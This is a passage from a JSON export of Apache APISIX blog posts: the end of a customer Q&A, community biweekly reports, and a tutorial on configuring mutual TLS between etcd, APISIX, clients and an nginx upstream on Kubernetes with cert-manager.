project is active, that it cares about its users and we currently have no concerns about its development.\\n\\n## Future Goals\\n\\n**1. What are the biggest challenges on the horizon for your industry?**\\n\\nFrom my perspective, the key challenges are:\\n\\nFirst challenge: M A C H. Where M stands for Microservices, A for API First, C for Cloud Native, and H for Headless. It\'s a great trend, but it\'s also a great challenge. How to enable teams to focus on individual areas and how shift the performance where it\'s needed? How to make the connection to the infrastructure? APISIX is one of the tools that enable us to deliver such solutions.\\n\\nSecond challenge: Artificial Intelligence and Machine Learning in general. Everyone can see the new LLM slash GPT craze. It is a disruptive technology. I can foresee more and more adoption of it in many projects.\\n\\n**2. What\u2019s your plan for the next half year?**\\n\\nCreate and deploy great projects. Provide more globally-used services. It\'s great to see your software used worldwide.\\n\\n**3. Is there anything we can do to improve APISIX or process for working together in the future?**\\n\\nI don\'t like to nitpick, but if you\'re really interested, I have mixed feelings regarding the bitnami\'s etcd dependency. I\'d like it replaced to not rely on a component delivered by a 3rd party.\\n\\n**4. How would you describe APISIX if you explained it to a friend?**\\n\\nI\'d say it\'s a Kubernetes-native, powerful, and simple-to-use API Gateway.\\n\\n**5. Could you please use one sentence to summarize your feeling about APISIX?**\\n\\nSimple to use, powerful, and enjoyable to use.\\n\\n## Summary\\n\\n\\"Simple to use, powerful, and enjoyable to use.\\" - This is the evaluation of APISIX by Lukasz Biegaj, a System Architect of Unity Group.\\n\\nWith its superior performance and Kubernetes-native and open-source features, APISIX has become the ultimate choice for Unity Group. APISIX allows Unity Group to easily set up an environment that can be accessed by development teams in multiple projects to quickly prototype, create, and deploy production-ready workloads, addressing the problem of strong separation of roles and reducing time costs.\\n\\nIf you are facing the same problem as Unity Group, please feel free to contact us. By choosing APISIX, you will solve your problems effortlessly!"},{"id":"Biweekly Report (Mar 13 - Mar 26)","metadata":{"permalink":"/blog/2023/03/30/weekly-report-0330","source":"@site/blog/2023/03/30/weekly-report-0330.md","title":"Biweekly Report (Mar 13 - Mar 26)","description":"The cloud-native API gateway Apache APISIX has added functions such as supporting variables when rewriting the header in the proxy rewrite plugin and updating the default HTTP router from `radixtree_uri` to `radixtree_host_uri`.","date":"2023-03-30T00:00:00.000Z","formattedDate":"March 30, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.92,"truncated":true,"authors":[],"prevItem":{"title":"Utilize APISIX in E-Commerce: User-friendly, Robust, and Delightful","permalink":"/blog/2023/04/07/apisix-unity-group-q&a"},"nextItem":{"title":"mTLS everywhere","permalink":"/blog/2023/03/23/mtls-everywhere"}},"content":"> From 3.13 to 3.26, 25 contributors submitted 54 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\nWe have also sorted out some issues for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/03/28/csedWKi7_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5-06%E6%9C%9F.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/03/28/cyWb9xTh_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E6%96%B0%E6%99%8B%E6%B5%B7%E6%8A%A5-06%E5%91%A8.png)\\n\\n## Good First Issues\\n\\n### Issue #9182\\n\\n**Link:** [https://github.com/apache/apisix/issues/9182](https://github.com/apache/apisix/issues/9182)\\n\\n**Description:** Correct the URI in `expose-api` tutorial.\\n\\n### Issue #1740\\n\\n**Link:** [https://github.com/apache/apisix-ingress-controller/issues/1740](https://github.com/apache/apisix-ingress-controller/issues/1740)\\n\\n**Description:** Add a spec for a discovery related fields to ApisixUpstream reference.\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [support variable when rewrite header in proxy rewrite plugin](https://github.com/apache/apisix/pull/9112) (Contributor: [monkeyDluffy6017](https://github.com/monkeyDluffy6017))\\n\\n- [Update the default HTTP router from `radixtree_uri` to `radixtree_host_uri`.](https://github.com/apache/apisix/pull/9047) (Contributor: [monkeyDluffy6017](https://github.com/monkeyDluffy6017))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.2.0](https://apisix.apache.org/blog/2023/03/10/release-apache-apisix-3.2.0/)\\n\\n  As the first LTS version since the 3.0 version, APISIX 3.2.0 is officially released! This release is a significant milestone for the 3.x era to replace the 2.x era.\\n\\n- [Make your security policy auditable](https://apisix.apache.org/blog/2023/03/02/security-policy-auditable/)\\n\\n  This blog shows how you can leverage OPA and Apache APISIX to move your authentication and authorization logic from the code to the infrastructure. The former allows you to audit your security policies, the latter coherence among all your upstream across all tech stacks.\\n\\n- [The right feature at the right place](https://apisix.apache.org/blog/2023/01/18/consul-with-apisix/)\\n\\n  This blog takes the example of per-user rate limiting to show how one can implement it in a library and an infrastructure component. Then, the author generalized this example and gave a couple of guidelines.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"mTLS everywhere","metadata":{"permalink":"/blog/2023/03/23/mtls-everywhere","source":"@site/blog/2023/03/23/mtls-everywhere.md","title":"mTLS everywhere","description":"Security in one\'s information system has always been among the most critical Non-Functional Requirements. Transport Secure Layer, aka TLS, formerly SSL, is among its many pillars. In this post, I\'ll show how to configure TLS for Apache APISIX.\\n","date":"2023-03-23T00:00:00.000Z","formattedDate":"March 23, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":12.435,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Biweekly Report (Mar 13 - Mar 26)","permalink":"/blog/2023/03/30/weekly-report-0330"},"nextItem":{"title":"Biweekly Report (Feb 27 - Mar 12)","permalink":"/blog/2023/03/17/weekly-report-0312"}},"content":">Security in one\'s information system has always been among the most critical Non-Functional Requirements. Transport Secure Layer, _aka_ TLS, formerly SSL, is among its many pillars. In this post, I\'ll show how to configure TLS for [Apache APISIX](https://apisix.apache.org/).\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/mtls-everywhere/\\" />\\n</head>\\n\\n## TLS in a few words\\n\\n[TLS](https://wikipedia.org/wiki/Transport_Layer_Security) offers several capabilities:\\n\\n* Server authentication: the client is confident that the server it exchanges data with is the right one. It avoids sending data, which might be confidential, to the wrong actor\\n* Optional client authentication: the other way around, the server only allows clients whose identity can be verified\\n* Confidentiality: no third party can read the data exchanged between the client and the server\\n* Integrity: no third party can tamper with the data\\n\\nTLS works through certificates. A certificate is similar to an ID, proving the certificate\'s holder identity. Just like an ID, you need to trust who delivered it. Trust is established through a chain: if I trust Alice, who trusts Bob, who in turn trusts Charlie, who delivered the certificate, then I trust the latter. In this scenario, Alice is known as the **root certificate authority**.\\n\\nTLS authentication is based on public key cryptography. Alice generates a public key/private key pair and publishes the public key. If one encrypts data with the public key, only the private key that generated the public key can decrypt them. The other usage is for one to encrypt data with the private key and everybody with the public key to decrypt it, thus proving their identity.\\n\\nFinally, mutual TLS, _aka_ mTLS, is the configuration of two-way TLS: server authentication to the client, as usual, but also the other way around, client authentication to the server.\\n\\nWe now have enough understanding of the concepts to get our hands dirty.\\n\\n## Generating certificates with cert-manager\\n\\nA couple of root <abbr title=\\"Certificate Authority\\">CA</abbr> are installed in browsers by default. That\'s how we can browse HTTPS websites safely, trusting that <https://apache.org> is the site they pretend to be. The infrastructure has no pre-installed certificates, so we must start from scratch.\\n\\nWe need at least one root certificate. In turn, it will generate all other certificates. While it\'s possible to do every manually, I\'ll rely on [cert-manager](https://cert-manager.io/) in Kubernetes. As its name implies, cert-manager is a solution to manage certificates.\\n\\nInstalling it with Helm is straightforward:\\n\\n```bash\\nhelm repo add jetstack https://charts.jetstack.io  #1\\n\\nhelm install \\\\\\n  cert-manager jetstack/cert-manager \\\\\\n  --namespace cert-manager \\\\                       #2\\n  --create-namespace \\\\                             #2\\n  --version v1.11.0 \\\\\\n  --set installCRDs=true \\\\\\n  --set prometheus.enabled=false                   #3\\n```\\n\\n1. Add the charts\' repository\\n2. Install the objects in a dedicated namespace\\n3. Don\'t monitor, in the scope of this post\\n\\nWe can make sure that everything works as expected by looking at the pods:\\n\\n```bash\\nkubectl get pods -n cert-manager\\n```\\n\\n```\\ncert-manager-cainjector-7f694c4c58-fc9bk  1/1  Running  2  (2d1h ago)  7d\\ncert-manager-cc4b776cf-8p2t8              1/1  Running  1  (2d1h ago)  7d\\ncert-manager-webhook-7cd8c769bb-494tl     1/1  Running  1  (2d1h ago)  7d\\n```\\n\\ncert-manager can sign certificates from multiple sources: HashiCorp Vault, Let\'s Encrypt, etc. To keep things simple:\\n\\n* We will generate our dedicated root certificate, _i.e._, `Self-Signed`\\n* We won\'t handle certificates rotation\\n\\nLet\'s start with the following:\\n\\n```yaml\\napiVersion: cert-manager.io/v1\\nkind: ClusterIssuer                           #1\\nmetadata:\\n  name: selfsigned-issuer\\nspec:\\n  selfSigned: {}\\n---\\napiVersion: v1\\nkind: Namespace\\nmetadata:\\n  name: tls                                   #2\\n---\\napiVersion: cert-manager.io/v1\\nkind: Certificate                             #3\\nmetadata:\\n  name: selfsigned-ca\\n  namespace: tls\\nspec:\\n  isCA: true\\n  commonName: selfsigned-ca\\n  secretName: root-secret\\n  issuerRef:\\n    name: selfsigned-issuer\\n    kind: ClusterIssuer\\n    group: cert-manager.io\\n---\\napiVersion: cert-manager.io/v1\\nkind: Issuer                                  #4\\nmetadata:\\n  name: ca-issuer\\n  namespace: tls\\nspec:\\n  ca:\\n    secretName: root-secret\\n```\\n\\n1. Certificate authority that generates certificates **cluster-wide**\\n2. Create a namespace for our demo\\n3. Namespaced root certificate using the cluster-wide issuer. Only used to create a namespaced issuer\\n4. Namespaced issuer. Used to create all other certificates in the post\\n\\nAfter applying the previous manifest, we should be able to see the single certificate that we created:\\n\\n```bash\\nkubectl get certificate -n tls\\n```\\n\\n```\\nNAME            READY   SECRET        AGE\\nselfsigned-ca   True    root-secret   7s\\n```\\n\\nThe certificate infrastructure is ready; let\'s look at Apache APISIX.\\n\\n## Quick overview of a sample Apache APISIX architecture\\n\\n[Apache APISIX](https://apisix.apache.org/) is an API Gateway. By default, it stores its configuration in [etcd](https://etcd.io/), a distributed key-value store - the same one used by Kubernetes. Note that in real-world scenarios, we should set up etcd clustering to improve the resiliency of the solution. For this post, we will limit ourselves to a single etcd instance. Apache APISIX offers an admin API via HTTP endpoints. Finally, the gateway forwards calls from the client to an upstream. Here\'s an overview of the architecture and the required certificates:\\n\\n![Apache APISIX architecture](https://static.apiseven.com/uploads/2023/06/08/dplOhFAt_apisix-architecture.svg)\\n\\nLet\'s start with the foundational bricks: etcd and Apache APISIX. We need two certificates: one for etcd, in the server role, and one for Apache APISIX, as the etcd client.\\n\\nLet\'s set up certificates from our namespaced issuer:\\n\\n```yaml\\napiVersion: cert-manager.io/v1\\nkind: Certificate\\nmetadata:\\n  name: etcd-server                         #1\\n  namespace: tls\\nspec:\\n  secretName: etcd-secret                   #2\\n  isCA: false\\n  usages:\\n    - client auth                           #3\\n    - server auth                           #3\\n  dnsNames:\\n    - etcd                                  #4\\n  issuerRef:\\n    name: ca-issuer                         #5\\n    kind: Issuer\\n---\\napiVersion: cert-manager.io/v1\\nkind: Certificate\\nmetadata:\\n  name: apisix-client                       #6\\n  namespace: tls\\nspec:\\n  secretName: apisix-client-secret\\n  isCA: false\\n  usages:\\n    - client auth\\n  emailAddresses:\\n    - apisix@apache.org                     #7\\n  issuerRef:\\n    name: ca-issuer                         #5\\n    kind: Issuer\\n```\\n\\n1. Certificate for etcd\\n2. Kubernetes `Secret` name, see below\\n3. Usages for this certificate\\n4. Kubernetes `Service` name, see below\\n5. Reference the previously namespaced issuer created earlier\\n6. Certificate for Apache APISIX as a client of etcd\\n7. Mandatory attribute for clients\\n\\nAfter applying the above manifest, we can list the certificates in the `tls` namespace:\\n\\n```bash\\nkubectl get certificates -n tls\\n```\\n\\n```\\nNAME              READY   SECRET                 AGE\\nselfsigned-ca     True    root-secret            8m59s    //1\\napisix-client     True    apisix-client-secret   8m22s    //2\\netcd-server       True    etcd-secret            8m54s    //2\\n```\\n\\n1. Previously created certificate\\n2. Newly-created certificates signed by `selfsigned-ca`\\n\\n## cert-manager\'s Certificates\\n\\nSo far, we have created `Certificate` objects, but we didn\'t explain what they are. Indeed, they are simple Kubernetes <abbr title=\\"Custom Resource Definition\\">CRD</abbr>s provided by cert-manager. Under the cover, cert-manager creates a Kubernetes `Secret` from a `Certificate`. It manages the whole lifecycle, so deleting a `Certificate` deletes the bounded `Secret`. The `secretName` attribute in the above manifest sets the `Secret` name.\\n\\n```bash\\nkubectl get secrets -n tls\\n```\\n\\n```\\nNAME                   TYPE                DATA   AGE\\napisix-client-secret   kubernetes.io/tls   3      35m\\netcd-secret            kubernetes.io/tls   3      35m\\nroot-secret            kubernetes.io/tls   3      35m\\n```\\n\\nLet\'s look at a `Secret`, _e.g._, `apisix-client-secret`:\\n\\n```bash\\nkubectl describe apisix-client-secret -n tls\\n```\\n\\n```\\nName:         apisix-client-secret\\nNamespace:    tls\\nLabels:       controller.cert-manager.io/fao=true\\nAnnotations:  cert-manager.io/alt-names:\\n              cert-manager.io/certificate-name: apisix-client\\n              cert-manager.io/common-name:\\n              cert-manager.io/ip-sans:\\n              cert-manager.io/issuer-group:\\n              cert-manager.io/issuer-kind: Issuer\\n              cert-manager.io/issuer-name: ca-issuer\\n              cert-manager.io/uri-sans:\\n\\nType:  kubernetes.io/tls\\n\\nData\\n====\\nca.crt:   1099 bytes\\ntls.crt:  1115 bytes\\ntls.key:  1679 bytes\\n```\\n\\nA `Secret` created by a `Certificate` provides three attributes:\\n\\n* `tls.crt`: The certificate itself\\n* `tls.key`: The private key\\n* `ca.crt`: The signing certificate in the certificate chain, _i.e._, `root-secret/tls.crt`\\n\\nKubernetes encodes `Secret` content in base 64. To get any of the above in plain text, one should decode it, _e.g._:\\n\\n```bash\\nkubectl get secret etcd-secret -n tls -o jsonpath=\'{ .data.tls\\\\.crt }\' | base64\\n```\\n\\n```\\n-----BEGIN CERTIFICATE-----\\nMIIDBjCCAe6gAwIBAgIQM3JUR8+R0vuUndjGK/aOgzANBgkqhkiG9w0BAQsFADAY\\nMRYwFAYDVQQDEw1zZWxmc2lnbmVkLWNhMB4XDTIzMDMxNjEwMTYyN1oXDTIzMDYx\\nNDEwMTYyN1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMQpMj/0\\ngiDVOjOosSRRKUwTzl1Wo2R9YYAeteOW3fuMiAd+XaBGmRO/+GWZQN1tyRQ3pITM\\nezBgogYAUUNcuqN/UAsgH/JM58niMjZdjRKn4+it94Nj1e24jFL4ts2snCn7FfKJ\\n3zRtY9tyS7Agw3tCwtXV68Xpmf3CsfhPmn3rGdWHXyYctzAZhqYfEswN3hxpJZxR\\nYVeb55WgDoPo5npZo3+yYiMtoOimIprcmZ2Ye8Wai9S4QKDafUWlvU5GQ65VVLzH\\nPEdOMwbWcwiLqwUv889TiKiC5cyAD6wJOuPRF0KKxxFnG+lHlg9J2S1i5sC3pqoc\\ni0pEQ+atOOyLMMECAwEAAaNkMGIwHQYDVR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUF\\nBwMBMAwGA1UdEwEB/wQCMAAwHwYDVR0jBBgwFoAU2ZaAdEficKUWPFRjdsKSEX/l\\ngbMwEgYDVR0RAQH/BAgwBoIEZXRjZDANBgkqhkiG9w0BAQsFAAOCAQEABcNvYTm8\\nZJe3jUq6f872dpNVulb2UvloTpWxQ8jwXgcrhekSKU6pZ4p9IPwfauHLjceMFJLp\\nt2eDi5fSQ1upeqXOofeyKSYjjyA/aVf1zMI8ReCCQtQuAVYyJWBlNLc3XMMecbcp\\nJLGtd/OAZnKDeYYkUX7cJ2wN6Wl/wGLM2lxsqDhEHEZwvGL0DmsdHw7hzSjdVmxs\\n0Qgkh4jVbNUKdBok5U9Ivr3P1xDPaD/FqGFyM0ssVOCHxtPxhOUA/m3DSr6klfEF\\nMcOfudZE958bChOrJgVrUnY3inR0J335bGQ1luEp5tYwPgyD9dG4MQEDD3oLwp+l\\n+NtTUqz8WVlMxQ==\\n-----END CERTIFICATE-----\\n```\\n\\n## Configuring mTLS between etcd and APISIX\\n\\nWith the certificates available, we can now configure mutual TLS between etcd and APISIX. Let\'s start with etcd:\\n\\n```yaml\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: etcd\\n  namespace: tls\\n  labels:\\n    role: config\\nspec:\\n  containers:\\n    - name: etcd\\n      image: bitnami/etcd:3.5.7\\n      ports:\\n        - containerPort: 2379\\n      env:\\n        - name: ETCD_TRUSTED_CA_FILE        #1\\n          value: /etc/ssl/private/ca.crt\\n        - name: ETCD_CERT_FILE              #2\\n          value: /etc/ssl/private/tls.crt\\n        - name: ETCD_KEY_FILE               #3\\n          value: /etc/ssl/private/tls.key\\n        - name: ETCD_ROOT_PASSWORD\\n          value: whatever\\n        - name: ETCD_CLIENT_CERT_AUTH       #4\\n          value: \\"true\\"\\n        - name: ETCD_LISTEN_CLIENT_URLS\\n          value: https://0.0.0.0:2379\\n      volumeMounts:\\n        - name: ssl\\n          mountPath: /etc/ssl/private       #5\\n  volumes:\\n    - name: ssl\\n      secret:\\n        secretName: etcd-secret             #5\\n```\\n\\n1. Set the trusted CA\\n2. Set the certificate\\n3. Set the private key\\n4. Require clients to pass their certificate, hence ensuring mutual authentication\\n5. Mount the previously generated secret in the container for access\\n\\nNow, it\'s Apache APISIX\'s turn:\\n\\n```yaml\\napiVersion: v1\\nkind: ConfigMap                                            #1\\nmetadata:\\n  name: apisix-config\\n  namespace: tls\\ndata:\\n  config.yaml: >-\\n    apisix:\\n      ssl:\\n        ssl_trusted_certificate: /etc/ssl/certs/ca.crt     #2\\n    deployment:\\n      etcd:\\n        host:\\n          - https://etcd:2379\\n        tls:\\n          cert: /etc/ssl/certs/tls.crt                     #2\\n          key: /etc/ssl/certs/tls.key                      #2\\n      admin:\\n        allow_admin:\\n          - 0.0.0.0/0\\n        https_admin: true                                  #3\\n        admin_api_mtls:\\n          admin_ssl_cert: /etc/ssl/private/tls.crt         #3\\n          admin_ssl_cert_key: /etc/ssl/private/tls.key     #3\\n          admin_ssl_ca_cert: /etc/ssl/private/ca.crt       #3\\n---\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: apisix\\n  namespace: tls\\n  labels:\\n    role: gateway\\nspec:\\n  containers:\\n    - name: apisix\\n      image: apache/apisix:3.2.0-debian\\n      ports:\\n        - containerPort: 9443                              #4\\n        - containerPort: 9180                              #5\\n      volumeMounts:\\n        - name: config                                      #1\\n          mountPath: /usr/local/apisix/conf/config.yaml\\n          subPath: config.yaml\\n        - name: ssl                                        #6\\n          mountPath: /etc/ssl/private\\n        - name: etcd-client                                #7\\n          mountPath: /etc/ssl/certs\\n  volumes:\\n    - name: config\\n      configMap:\\n        name: apisix-config\\n    - name: ssl                                            #6,8\\n      secret:\\n        secretName: apisix-server-secret\\n    - name: etcd-client                                    #7,8\\n      secret:\\n        secretName: apisix-client-secret\\n```\\n\\n1. Apache APISIX doesn\'t offer configuration via environment variables. We need to use a `ConfigMap` that mirrors the regular `config.yaml` file\\n2. Configure _client_ authentication for etcd\\n3. Configure _server_ authentication for the Admin API\\n4. Regular HTTPS port\\n5. Admin HTTPS port\\n6. Certificates for server authentication\\n7. Certificates for client authentication\\n8. Two sets of certificates are used, one for server authentication for the Admin API and regular HTTPS, and one for client authentication for etcd.\\n\\nAt this point, we can apply the above manifests and see the two pods communicating. When connecting, Apache APISIX sends its `apisix-client` certificate via HTTPS. Because an authority signs the certificate that etcd trusts, it allows the connection.\\n\\nI\'ve omitted the `Service` definition for brevity\'s sake, but you can check them in the associated [GitHub repo](https://github.com/ajavageek/tls-apisix).\\n\\n```\\nNAME     READY   STATUS    RESTARTS   AGE\\napisix   1/1     Running   0          179m\\netcd     1/1     Running   0          179m\\n```\\n\\n## Client access\\n\\nNow that we\'ve set up the basic infrastructure, we should test accessing it with a client. We will use our faithful `curl`, but any client that allows configuring certificates should work, _e.g_, httpie.\\n\\nThe first step is to create a dedicated certificate-key pair for the client:\\n\\n```yaml\\napiVersion: cert-manager.io/v1\\nkind: Certificate\\nmetadata:\\n  name: curl-client\\n  namespace: tls\\nspec:\\n  secretName: curl-secret\\n  isCA: false\\n  usages:\\n    - client auth\\n  emailAddresses:\\n    - curl@localhost.dev\\n  issuerRef:\\n    name: ca-issuer\\n    kind: Issuer\\n```\\n\\n`curl` requires a path to the certificate file instead of the content. We can go around this limitation through the magic of zsh: the `=( ... )` syntax allows the creation of a temporary file. If you\'re using another shell, you\'ll need to find the equivalent syntax or download the files manually.\\n\\nLet\'s query the Admin API for all existing routes. This simple command allows checking that Apache APISIX is connected to etcd, and it can read its configuration from there.\\n\\n```bash\\ncurl --resolve \'admin:32180:127.0.0.1\' https://admin:32180/apisix/admin/routes \\\\                     #1\\n     --cert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.crt }\' | base64 -d) \\\\  #2\\n     --key =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.key }\' | base64 -d) \\\\   #2\\n     --cacert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.ca\\\\.crt }\' | base64 -d) \\\\ #2\\n     -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\'\\n```\\n\\n1. `--resolve` avoids polluting one\'s `/etc/hosts` file. `curl` will translate `admin` to `localhost`, but the query is sent to `admin` inside the Kubernetes cluster, thus using the correct `Service`\\n2. Get the required data inside the `Secret`, decode it, and use it as a temporary file\\n\\nIf everything works, and it should, the result should be the following:\\n\\n```json\\n{\\"total\\":0,\\"list\\":[]}\\n```\\n\\nNo routes are available so far because we have yet to create any.\\n\\n## TLS with upstreams\\n\\nLast but not least, we should configure TLS for upstreams. In the following, I\'ll use a simple [nginx](https://nginx.org/) instance that responds with static content. Use it as an illustration for more complex upstreams.\\n\\nThe first step, as always, is to generate a dedicated `Certificate` for the upstream. I\'ll skip how to do it as we already created a few. I call it `upstream-server` and its `Secret`, unimaginatively, `upstream-secret`. We can now use the latter to secure nginx:\\n\\n```yaml\\napiVersion: v1\\nkind: ConfigMap                                           #1\\nmetadata:\\n  name: nginx-config\\n  namespace: tls\\ndata:\\n  nginx.conf: >-\\n    events {\\n      worker_connections 1024;\\n    }\\n    http {\\n      server {\\n        listen              443 ssl;\\n        server_name         upstream;\\n        ssl_certificate     /etc/ssl/private/tls.crt;     #2\\n        ssl_certificate_key /etc/ssl/private/tls.key;     #2\\n\\n        root /www/data;\\n        location / {\\n            index index.json;\\n        }\\n      }\\n    }\\n---\\napiVersion: v1\\nkind: Pod\\nmetadata:\\n  name: upstream\\n  namespace: tls\\n  labels:\\n    role: upstream\\nspec:\\n  containers:\\n    - name: upstream\\n      image: nginx:1.23-alpine\\n      ports:\\n        - containerPort: 443\\n      volumeMounts:\\n        - name: config\\n          mountPath: /etc/nginx/nginx.conf                #1\\n          subPath: nginx.conf\\n        - name: content\\n          mountPath: /www/data/index.json                 #3\\n          subPath: index.json\\n        - name: ssl                                       #2\\n          mountPath: /etc/ssl/private\\n  volumes:\\n    - name: config\\n      configMap:\\n        name: nginx-config\\n    - name: ssl                                           #2\\n      secret:\\n        secretName: upstream-secret\\n    - name: content                                       #3\\n      configMap:\\n        name: nginx-content\\n```\\n\\n1. nginx doesn\'t allow configuration via environment variables; we need to use the `ConfigMap` approach\\n2. Use the key-certificate pair created via the `Certificate`\\n3. Some static content unimportant in the scope of this post\\n\\nThe next step is to create the route with the help of the Admin API. We prepared everything in the previous step; now we can use the API:\\n\\n```bash\\ncurl --resolve \'admin:32180:127.0.0.1\' https://admin:32180/apisix/admin/routes/1 \\\\\\n     --cert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.crt }\' | base64 -d) \\\\     #1\\n     --key =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.key }\' | base64 -d) \\\\      #1\\n     --cacert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.ca\\\\.crt }\' | base64 -d) \\\\    #1\\n     -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -i -d \\"{\\n        \\\\\\"uri\\\\\\": \\\\\\"/\\\\\\",\\n        \\\\\\"upstream\\\\\\": {\\n          \\\\\\"scheme\\\\\\": \\\\\\"https\\\\\\",                                                                        #2\\n          \\\\\\"nodes\\\\\\": {\\n            \\\\\\"upstream:443\\\\\\": 1\\n          },\\n          \\\\\\"tls\\\\\\": {\\n            \\\\\\"client_cert\\\\\\": \\\\\\"$(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.crt }\' | base64 -d)\\\\\\", #3\\n            \\\\\\"client_key\\\\\\": \\\\\\"$(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.key }\' | base64 -d)\\\\\\"   #3\\n          }\\n        }\\n     }\\"\\n```\\n\\n1. Client auth for Admin API, as above\\n2. Use HTTPS for the upstream\\n3. Configure key-certificate pair for the route. Apache APISIX stores the data in etcd and will use them when you call the route. Alternatively, you can keep the pair as a dedicated object and use the newly-created reference (just like for upstreams). It depends on how many routes the certificate needs. For more information, check the [SSL endpoint](https://apisix.apache.org/docs/apisix/admin-api/#ssl)\\n\\nFinally, we can check it works as expected:\\n\\n```bash\\ncurl --resolve \'upstream:32443:127.0.0.1\' https://upstream:32443/ \\\\\\n     --cert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.crt }\' | base64 -d) \\\\\\n     --key =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.tls\\\\.key }\' | base64 -d) \\\\\\n     --cacert =(kubectl get secret curl-secret -n tls -o jsonpath=\'{ .data.ca\\\\.crt }\' | base64 -d)\\n```\\n\\nAnd it does:\\n\\n```json\\n{ \\"hello\\": \\"world\\" }\\n```\\n\\n## Conclusion\\n\\nIn this post, I\'ve described a working Apache APISIX architecture and implemented mutual TLS between all the components: etcd and APISIX, client and APISIX, and finally, client and upstream. I hope it will help you to achieve the same.\\n\\nThe complete source code for this post can be found on [GitHub](https//github.com/ajavageek/tls-apisix).\\n\\n**To go further:**\\n\\n* [How to Easily Deploy Apache APISIX in Kubernetes](https://apisix.apache.org/blog/2021/12/15/deploy-apisix-in-kubernetes/)\\n* [cert-manager](https://cert-manager.io/)\\n* [A Simple CA Setup with Kubernetes Cert Manager](https://medium.com/geekculture/a-simple-ca-setup-with-kubernetes-cert-manager-bc8ccbd9c2)\\n* [Mutual TLS Authentication](https://apisix.apache.org/docs/apisix/mtls/)"},{"id":"Biweekly Report (Feb 27 - Mar 12)","metadata":{"permalink":"/blog/2023/03/17/weekly-report-0312","source":"@site/blog/2023/03/17/weekly-report-0312.md","title":"Biweekly Report (Feb 27 - Mar 12)","description":"The cloud-native API gateway Apache APISIX has added functions such as enabling opentelemetry plugin to support https upstream and adding \'range_id\' algorithm for \'request-id\' plugin.","date":"2023-03-17T00:00:00.000Z","formattedDate":"March 17, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.045,"truncated":true,"authors":[],"prevItem":{"title":"mTLS everywhere","permalink":"/blog/2023/03/23/mtls-everywhere"},"nextItem":{"title":"gRPC on the client side","permalink":"/blog/2023/03/16/grpc-client-side"}},"content":"> From 2.27 to 3.12, 29 contributors submitted 74 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/03/14/0rjys38r_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5-05%E6%9C%9F.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/03/14/WZpcYrG7_%E7%A4%BE%E5%8C%BA%E5%8F%8C%E5%91%A8%E6%8A%A5-%E6%96%B0%E6%99%8B%E6%B5%B7%E6%8A%A5-05%E6%9C%9F.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [Support clickhouse-logger plugin log option of request/response body](https://github.com/apache/apisix/pull/8722) (Contributor: [pixeldin](https://github.com/pixeldin))\\n\\n- [Support reserved environment variable \\"APISIX_DEPLOYMENT_ETCD_HOST\\"](https://github.com/apache/apisix/pull/8898) (Contributor: [An-DJ](https://github.com/An-DJ))\\n\\n- [Add degraphql 